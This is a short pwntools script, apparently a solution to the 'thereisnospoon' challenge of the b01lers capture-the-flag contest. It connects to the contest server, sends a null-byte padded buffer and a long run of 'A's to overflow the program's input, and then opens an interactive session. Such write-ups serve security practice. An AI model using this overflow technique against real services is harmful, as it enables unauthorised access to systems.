#!/usr/bin/python3
from pwn import *

#p = process ('/home/pooty/shared/biolers/thereisnospoon')
p = remote( 'chal.ctf.b01lers.com', '1006')

p.sendline(b'a' + b'\x00'*240)
p.sendline('A'*206)

p.interactive()
